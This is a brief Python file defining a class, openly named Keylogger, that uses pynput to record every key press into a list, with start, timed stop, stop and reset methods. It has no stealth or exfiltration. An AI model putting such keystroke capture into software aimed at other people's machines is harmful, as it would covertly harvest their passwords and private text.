from pynput.keyboard import Listener
from time import sleep

class Keylogger:
    def __init__(self):
        self.result = []
        self.listener = Listener(on_press = lambda event: self.result.append(event))

    def start(self, time):
        self.listener.start()
        if (time):
            sleep(time)
            self.listener.stop()

    def stop(self):
        self.listener.stop()
    
    def reset(self):
        self.result = []
